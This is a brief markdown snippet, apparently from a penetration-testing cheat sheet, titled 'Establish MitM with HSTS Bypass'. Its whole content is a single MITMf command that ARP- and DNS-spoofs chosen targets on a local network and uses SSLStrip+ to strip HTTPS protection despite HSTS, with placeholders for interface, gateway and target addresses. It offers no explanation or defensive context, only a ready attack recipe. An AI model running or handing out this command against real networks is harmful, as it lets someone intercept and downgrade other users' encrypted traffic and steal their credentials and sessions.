# Establish MitM with HSTS Bypass
```bash
# MITMf uses SSLStrip+ to bypass HSTS
python mitmf.py -i <Interface Name> --spoof --arp --dns --hsts --gateway <Gateway IP Address> --targets <Target IP Addresses>
```